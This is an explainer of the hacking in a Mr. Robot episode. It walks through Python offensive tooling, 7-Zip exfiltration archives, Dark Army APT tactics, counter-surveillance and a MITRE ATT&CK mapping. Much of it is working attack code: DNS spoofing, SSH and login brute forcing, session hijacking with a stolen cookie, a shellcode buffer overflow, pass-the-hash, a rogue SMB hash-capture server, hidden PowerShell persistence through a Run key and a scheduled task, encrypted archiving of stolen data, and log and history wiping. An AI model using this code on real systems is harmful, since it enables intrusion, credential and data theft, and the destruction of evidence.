# Season 2, Episode 11: eps2.9_pyth0n-pt1.p7z

## Episode Overview

The episode title references Python (the programming language most commonly associated with hacking and security research) and `.p7z` (the 7-Zip compressed archive format). This is Part 1 of the season finale, where multiple plot threads converge. The Dark Army's true nature as an Advanced Persistent Threat (APT) becomes increasingly clear, and counter-surveillance techniques are employed as characters attempt to evade both law enforcement and the Dark Army. The themes of Python scripting and encrypted archives reflect the technical realities of offensive security operations and secure data handling.

---

## Hacks & Techniques

### 1. Python Scripting for Hacking

Python is the dominant programming language in the security community. Its readability, extensive library ecosystem, and rapid development cycle make it ideal for writing exploits, automating attacks, and building security tools.

**Why Python Dominates Security:**

- **Rapid prototyping**: Write and test exploit code quickly
- **Rich library ecosystem**: Libraries for every protocol and attack technique
- **Cross-platform**: Runs on Linux, Windows, macOS without modification
- **Community**: Massive security community contributing tools and libraries
- **Integration**: Easy to combine with other tools and frameworks
- **Scripting**: Perfect for automation of repetitive security tasks

**Key Python Security Libraries:**

**Scapy -- Packet Manipulation:**

Scapy is a powerful interactive packet manipulation library that allows sending, sniffing, dissecting, and forging network packets.

```python
from scapy.all import *

# Craft and send a custom TCP SYN packet
packet = IP(dst="target.com") / TCP(dport=80, flags="S")
response = sr1(packet, timeout=2)

# ARP scan to discover hosts on local network
answered, unanswered = srp(
    Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.1.0/24"),
    timeout=2, verbose=False
)
for sent, received in answered:
    print(f"Host: {received.psrc} MAC: {received.hwsrc}")

# TCP SYN scan (port scanner)
def syn_scan(target, ports):
    results = []
    for port in ports:
        pkt = IP(dst=target) / TCP(dport=port, flags="S")
        resp = sr1(pkt, timeout=1, verbose=False)
        if resp and resp.haslayer(TCP):
            if resp[TCP].flags == 0x12:  # SYN-ACK
                results.append(port)
                sr1(IP(dst=target) / TCP(dport=port, flags="R"),
                    timeout=1, verbose=False)
    return results

open_ports = syn_scan("192.168.1.100", range(1, 1024))
print(f"Open ports: {open_ports}")

# DNS spoofing
def dns_spoof(pkt):
    if pkt.haslayer(DNSQR):
        spoofed = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                  UDP(dport=pkt[UDP].sport, sport=53) / \
                  DNS(id=pkt[DNS].id, qr=1, aa=1,
                      qd=pkt[DNS].qd,
                      an=DNSRR(rrname=pkt[DNSQR].qname,
                               rdata="evil_ip"))
        send(spoofed, verbose=False)

sniff(filter="udp port 53", prn=dns_spoof)
```

**Requests -- HTTP Library:**

```python
import requests

# Web application scanning
def check_default_creds(url, credentials):
    """Try default credentials against a web login"""
    for username, password in credentials:
        response = requests.post(url, data={
            'username': username,
            'password': password
        }, allow_redirects=False)

        if response.status_code == 302 or 'dashboard' in response.text.lower():
            print(f"[+] Valid credentials: {username}:{password}")
            return (username, password)
    return None

# Directory brute forcing
def dir_brute(base_url, wordlist_path):
    """Discover hidden directories and files"""
    with open(wordlist_path) as f:
        for word in f:
            url = f"{base_url}/{word.strip()}"
            try:
                resp = requests.get(url, timeout=3)
                if resp.status_code != 404:
                    print(f"[{resp.status_code}] {url}")
            except requests.exceptions.RequestException:
                continue

# Session hijacking
session = requests.Session()
session.cookies.set('session_id', 'stolen_cookie_value')
response = session.get('https://target.com/admin')
```

**Paramiko -- SSH Library:**

```python
import paramiko

# SSH brute force
def ssh_brute(host, username, password_list):
    """Attempt SSH authentication with password list"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        try:
            ssh.connect(host, username=username, password=password,
                       timeout=5, banner_timeout=5)
            print(f"[+] Success: {username}:{password}")
            return ssh
        except paramiko.AuthenticationException:
            continue
        except Exception as e:
            print(f"[-] Error: {e}")
            break
    return None

# SSH command execution
def ssh_execute(host, username, key_path, command):
    """Execute command via SSH using key authentication"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    private_key = paramiko.RSAKey.from_private_key_file(key_path)
    ssh.connect(host, username=username, pkey=private_key)

    stdin, stdout, stderr = ssh.exec_command(command)
    output = stdout.read().decode()
    errors = stderr.read().decode()

    ssh.close()
    return output, errors

# SSH tunneling (port forwarding)
transport = paramiko.Transport(('target.com', 22))
transport.connect(username='user', password='pass')
channel = transport.open_channel('direct-tcpip',
                                  ('internal_host', 3306),
                                  ('localhost', 0))
```

**pwntools -- CTF/Exploit Development:**

```python
from pwn import *

# Connect to a remote service
conn = remote('target.com', 9999)

# Receive data until a prompt
conn.recvuntil(b'Password: ')

# Send exploit payload
payload = b'A' * 64  # Buffer overflow padding
payload += p64(0xdeadbeef)  # Return address (little-endian)
payload += asm(shellcraft.sh())  # Shellcode

conn.sendline(payload)

# Interactive shell after exploit
conn.interactive()

# Format string exploit
def format_string_attack(target_addr, value):
    """Generate format string payload"""
    payload = fmtstr_payload(offset=6, writes={target_addr: value})
    return payload

# ROP chain generation
elf = ELF('./vulnerable_binary')
rop = ROP(elf)
rop.call('system', [next(elf.search(b'/bin/sh'))])
print(rop.dump())
```

**Impacket -- Network Protocol Library:**

```python
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport, samr
from impacket import smbserver

# SMB enumeration
conn = SMBConnection('target.com', 'target.com')
conn.login('username', 'password')

# List shares
shares = conn.listShares()
for share in shares:
    print(f"Share: {share['shi1_netname']}")

# Download file from share
conn.getFile('CaseFiles', 'investigation_report.pdf',
             open('report.pdf', 'wb').write)

# Pass-the-hash authentication (no password needed)
conn = SMBConnection('target.com', 'target.com')
conn.login('admin', '', nthash='aad3b435b51404eeaad3b435b51404ee')

# Start a rogue SMB server for hash capture
server = smbserver.SimpleSMBServer()
server.addShare('SHARE', '/tmp/share')
server.setSMB2Support(True)
server.start()
```

### 2. 7-Zip Encrypted Archives (AES-256)

The `.p7z` file extension refers to 7-Zip archives, which support strong AES-256 encryption. This is commonly used for secure data storage and transfer.

**7-Zip Encryption Features:**

- **AES-256 encryption**: Military-grade encryption for archive contents
- **Header encryption**: Can encrypt file names and directory structure, not just content
- **Key derivation**: Uses a large number of SHA-256 iterations for key stretching
- **LZMA/LZMA2 compression**: High compression ratio before encryption
- **No known backdoors**: 7-Zip is open-source and extensively audited

```bash
# Create an AES-256 encrypted archive
7z a -p -mhe=on sensitive_data.7z /path/to/files/
# -p prompts for password
# -mhe=on encrypts file headers (names)

# Create archive with specific password
7z a -pMySecurePassword123! -mhe=on exfiltrated_data.7z /data/

# Extract encrypted archive
7z x -pMySecurePassword123! exfiltrated_data.7z

# List contents without extracting (requires password if headers encrypted)
7z l -pMySecurePassword123! exfiltrated_data.7z

# Create split archive (for exfiltration in chunks)
7z a -p -mhe=on -v10m data.7z /path/to/large/dataset/
# Creates data.7z.001, data.7z.002, etc. (10MB each)
```

**Python-Based Archive Operations:**

```python
import py7zr
import os

# Create encrypted 7z archive
with py7zr.SevenZipFile('exfil.7z', 'w', password='StrongPass!') as z:
    z.writeall('/path/to/stolen/data/', 'data')

# Extract encrypted archive
with py7zr.SevenZipFile('exfil.7z', 'r', password='StrongPass!') as z:
    z.extractall('/path/to/output/')

# Secure deletion of original files after archiving
import shutil
shutil.rmtree('/path/to/stolen/data/')
```

### 3. Dark Army APT Tactics

The Dark Army operates as an Advanced Persistent Threat (APT) group with nation-state-level capabilities. Their tactics, techniques, and procedures (TTPs) mirror real-world APT groups.

**APT Characteristics of the Dark Army:**

**Persistence:**

APT groups maintain long-term access to compromised networks through multiple persistence mechanisms:

```python
# Example: Multiple persistence mechanisms
# 1. Registry Run key
import winreg
key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                      r"Software\Microsoft\Windows\CurrentVersion\Run",
                      0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ,
                   "powershell -w hidden -c \"IEX(...)\"")

# 2. Scheduled task
import subprocess
subprocess.run([
    'schtasks', '/create', '/tn', 'MicrosoftEdgeUpdate',
    '/tr', 'powershell -w hidden -ep bypass -f C:\\Users\\Public\\update.ps1',
    '/sc', 'ONLOGON', '/ru', 'SYSTEM'
])

# 3. WMI event subscription (fileless persistence)
# Survives reboots, runs from WMI repository
```

**Zero-Day Exploits:**

- APT groups stockpile zero-day vulnerabilities (unknown to the vendor) for critical operations
- Zero-days are expensive ($50,000 to $2,500,000+ on the exploit market)
- They are used sparingly to avoid detection and preserve their value
- Once used, there is a window before the vulnerability is discovered and patched

**Supply Chain Attacks:**

The Dark Army's sophistication extends to supply chain compromises:

```
Normal Software Update:
[Developer] -> [Build Server] -> [Update Server] -> [Users]

Supply Chain Attack:
[Developer] -> [COMPROMISED Build Server] -> [Update Server] -> [Users]
                      |                                            |
                [Malicious code injected                  [Users install
                 during build process]                     backdoored update]
```

**Real-world supply chain attacks:**
- **SolarWinds (2020)**: Russian intelligence compromised the build process for the Orion IT monitoring platform, distributing malware to ~18,000 organizations including US government agencies
- **CCleaner (2017)**: Attackers compromised the build environment to distribute a backdoored version of the popular utility
- **NotPetya (2017)**: Ukrainian tax software MEDoc was compromised to distribute the NotPetya wiper, causing $10 billion+ in global damages

### 4. Counter-Surveillance Techniques

As the stakes rise, characters employ counter-surveillance to detect and evade monitoring.

**Digital Counter-Surveillance:**

```bash
# Check for surveillance processes
ps aux | grep -E "tcpdump|wireshark|tshark|sniff|capture|keylog"

# Detect network monitoring (promiscuous mode)
ip link show | grep PROMISC

# Check for ARP spoofing (MITM indicator)
arp -a
# Look for duplicate MAC addresses or unexpected entries

# Detect rogue wireless access points
nmcli device wifi list | sort -k3 -rn

# Monitor for suspicious network connections
ss -tunap | grep ESTABLISHED | grep -v -E ":(443|80|53|22) "

# Check if being tracked via DNS
# Use DNS-over-HTTPS or DNS-over-TLS
systemd-resolve --status | grep "DNS Servers"
```

**Physical Counter-Surveillance:**

- **Bug sweeping**: Using RF detectors to find hidden transmitters
- **TSCM (Technical Surveillance Countermeasures)**: Professional bug-sweeping with spectrum analyzers
- **Faraday bags/cages**: Blocking all wireless signals to/from devices
- **Visual inspection**: Checking for hidden cameras, modified outlets, and unfamiliar devices
- **Route awareness**: Taking different routes, checking for followers
- **Phone hygiene**: Removing batteries (when possible), using Faraday bags, or leaving phones behind for sensitive meetings

**Anti-Forensics:**

```bash
# Secure file deletion (overwrite before delete)
shred -vzn 3 sensitive_file.txt

# Wipe free space on a drive
sfill -v /mount/point/

# Clear bash history
history -c
shred ~/.bash_history
unset HISTFILE

# Clear system logs
> /var/log/syslog
> /var/log/auth.log
journalctl --vacuum-time=1s

# Timestomping (modify file timestamps)
touch -t 202001010000 modified_file.txt

# Clear browser data
rm -rf ~/.mozilla/firefox/*.default/places.sqlite
rm -rf ~/.config/google-chrome/Default/History
```

---

## Tools Used

| Tool | Purpose |
|---|---|
| **Python 3** | Primary scripting language for security tools |
| **Scapy** | Network packet crafting and manipulation |
| **Requests** | HTTP library for web exploitation |
| **Paramiko** | SSH client library for remote access |
| **pwntools** | Exploit development and CTF framework |
| **Impacket** | Windows/SMB protocol exploitation |
| **7-Zip** | AES-256 encrypted archive creation |
| **Metasploit** | Exploitation framework (often scripted via Python) |
| **Wireshark/tshark** | Network protocol analysis |
| **RF detector** | Physical counter-surveillance |

---

## Commands Shown

**Python Security Script Examples:**

```bash
# Install key security libraries
pip install scapy requests paramiko pwntools impacket py7zr

# Quick network scan with scapy
python3 -c "
from scapy.all import *
ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst='192.168.1.0/24'), timeout=2, verbose=0)
for s, r in ans:
    print(f'{r.psrc:15s} {r.hwsrc}')
"

# Simple port scanner
python3 -c "
import socket
target = '192.168.1.100'
for port in range(1, 1025):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    result = s.connect_ex((target, port))
    if result == 0:
        print(f'Port {port}: Open')
    s.close()
"
```

**7-Zip Operations:**

```bash
# Create encrypted archive of exfiltrated data
7z a -t7z -m0=lzma2 -mx=9 -mfb=64 -md=32m -ms=on \
  -p'$(openssl rand -base64 32)' -mhe=on \
  exfil_$(date +%Y%m%d).7z /tmp/staged_data/

# Verify archive integrity
7z t exfil_20151201.7z

# Create self-extracting archive (for target deployment)
7z a -sfx archive.exe payload/
```

**Counter-Surveillance Checks:**

```bash
# Full system audit for surveillance indicators
# Check running processes
ps auxf | grep -v grep | grep -iE "keylog|capture|sniff|hook|inject|dump"

# Check listening ports
ss -tlnp

# Check for unauthorized SSH keys
find / -name "authorized_keys" -exec cat {} \; 2>/dev/null

# Check for unauthorized cron jobs
for user in $(cut -f1 -d: /etc/passwd); do
    crontab -l -u $user 2>/dev/null | grep -v "^#"
done

# Scan for wireless surveillance devices
iw dev wlan0 scan | grep -E "SSID|signal"
```

---

## Real-World Parallels

### Python in Real-World Hacking

- **Exploit-DB**: A significant portion of public exploits are written in Python. The Exploit Database (exploit-db.com) contains thousands of Python-based proof-of-concept exploits.

- **Major security tools written in Python**: SQLMap (SQL injection), Volatility (memory forensics), Impacket (Windows protocols), theHarvester (OSINT), Recon-ng (reconnaissance), and many more.

- **Bug bounty hunters** frequently use Python scripts to automate vulnerability discovery across large attack surfaces.

### APT Groups in the Real World

The Dark Army mirrors several real-world APT groups:

- **APT1 / Comment Crew (China)**: Documented by Mandiant in 2013, this PLA Unit 61398 conducted extensive cyber espionage against Western corporations and government agencies.

- **APT28 / Fancy Bear (Russia)**: GRU-affiliated group responsible for the DNC hack (2016), Bundestag hack (2015), and numerous other operations.

- **APT29 / Cozy Bear (Russia)**: SVR-affiliated group responsible for the SolarWinds supply chain attack and breaches of multiple government agencies.

- **Lazarus Group (North Korea)**: Responsible for the Sony Pictures hack (2014), Bangladesh Bank heist ($81 million, 2016), and WannaCry ransomware (2017).

- **Equation Group (United States/NSA)**: Discovered by Kaspersky in 2015, considered the most sophisticated APT group ever documented. Their tools (leaked by Shadow Brokers in 2016-2017) included EternalBlue, which was later used in WannaCry and NotPetya.

### 7-Zip Encryption in Criminal Operations

- **Ransomware groups** frequently use 7-Zip encryption for data exfiltration before deploying ransomware, creating encrypted archives of stolen data that they then threaten to release.

- **The use of encrypted archives** for secure data transport is standard practice in both legitimate security operations and criminal activities. Law enforcement often encounters 7-Zip encrypted archives during investigations.

### Counter-Surveillance in Practice

- **Edward Snowden** famously asked journalists to place their phones in the refrigerator during their first meeting in Hong Kong (a makeshift Faraday cage to block signals).

- **TSCM services** are a real industry, with firms charging thousands of dollars to sweep offices for electronic surveillance devices.

- **The Crypto AG scandal (2020)**: It was revealed that the Swiss encryption company Crypto AG was secretly owned by the CIA and BND (German intelligence), and its encryption machines were deliberately weakened. This demonstrates why counter-surveillance and trust verification are critical.

---

## Tool Links

| Tool | Link |
|---|---|
| Scapy | https://scapy.net/ |
| Paramiko | https://www.paramiko.org/ |
| pwntools | https://github.com/Gallopsled/pwntools |
| Impacket | https://github.com/fortra/impacket |
| 7-Zip | https://www.7-zip.org/ |
| Metasploit | https://www.metasploit.com/ |
| Wireshark | https://www.wireshark.org/ |

---

## MITRE ATT&CK Mapping

| Episode Technique | MITRE ATT&CK ID | Name | Link |
|---|---|---|---|
| Python scripting for exploits | T1059 | Command and Scripting Interpreter | https://attack.mitre.org/techniques/T1059/ |
| Brute force SSH (Paramiko) | T1110 | Brute Force | https://attack.mitre.org/techniques/T1110/ |
| Network service discovery (Scapy scan) | T1046 | Network Service Discovery | https://attack.mitre.org/techniques/T1046/ |
| Exfiltration in encrypted files (7z) | T1041 | Exfiltration Over C2 Channel | https://attack.mitre.org/techniques/T1041/ |
| File obfuscation (7z AES-256) | T1027 | Obfuscated Files or Information | https://attack.mitre.org/techniques/T1027/ |
| Persistence via registry/scheduled task (APT) | T1547 | Boot or Logon Autostart Execution | https://attack.mitre.org/techniques/T1547/ |
| Scheduled task (APT persistence) | T1053 | Scheduled Task/Job | https://attack.mitre.org/techniques/T1053/ |
| Anti-forensics (indicator removal) | T1070 | Indicator Removal | https://attack.mitre.org/techniques/T1070/ |
| Supply chain compromise (Dark Army) | T1195 | Supply Chain Compromise | https://attack.mitre.org/techniques/T1195/ |
| Remote services (SSH) | T1021 | Remote Services | https://attack.mitre.org/techniques/T1021/ |
| Input capture (keylogger detection) | T1056 | Input Capture | https://attack.mitre.org/techniques/T1056/ |

---

## References and Further Reading

- **Mandiant APT1 Report (2013)**: Landmark report documenting Chinese cyber espionage by PLA Unit 61398.
- **SolarWinds Supply Chain Attack (2020)**: Analysis of the SUNBURST backdoor distributed via compromised SolarWinds Orion updates.
- **CVE-2017-0144** (EternalBlue - SMB exploit): https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144
- **Shadow Brokers Leak (2016-2017)**: Leaked NSA Equation Group tools including EternalBlue and DoublePulsar.
- **SANS Institute - Python for Penetration Testing**: https://www.sans.org/white-papers/ - Papers on using Python security libraries for penetration testing.
- **DEF CON - APT Tactics and Counter-Surveillance**: Multiple presentations on APT group TTPs and defensive counter-surveillance techniques.
- **Crypto AG Scandal (2020)**: Washington Post investigation revealing CIA/BND ownership of the Swiss encryption company.

---

## Search Tags

```
tags: [python, scapy, paramiko, pwntools, impacket, 7zip, apt, dark-army, counter-surveillance, anti-forensics, supply-chain, metasploit, exploit-development]
season: 2
episode: 11
mitre: [T1059, T1110, T1046, T1041, T1027, T1547, T1053, T1070, T1195, T1021, T1056]
```
